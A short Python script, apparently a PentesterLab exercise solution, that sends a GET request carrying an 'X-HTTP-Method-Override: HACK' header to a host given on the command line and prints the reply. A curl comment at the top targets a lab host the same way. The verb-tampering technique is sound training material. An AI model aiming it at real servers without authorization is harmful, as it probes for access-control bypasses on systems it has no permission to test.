#curl http://ptl-7532f00d-10355c6f.libcurl.so/pentesterlab -H 'X-HTTP-Method-Override: HACK'

import urllib
import requests
import sys
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("host", help="enter a domain or IP address")
args = parser.parse_args()

host = sys.argv[1]

headers = {'X-HTTP-Method-Override': 'HACK'}

response = requests.get(host, headers=headers)

print(response.text)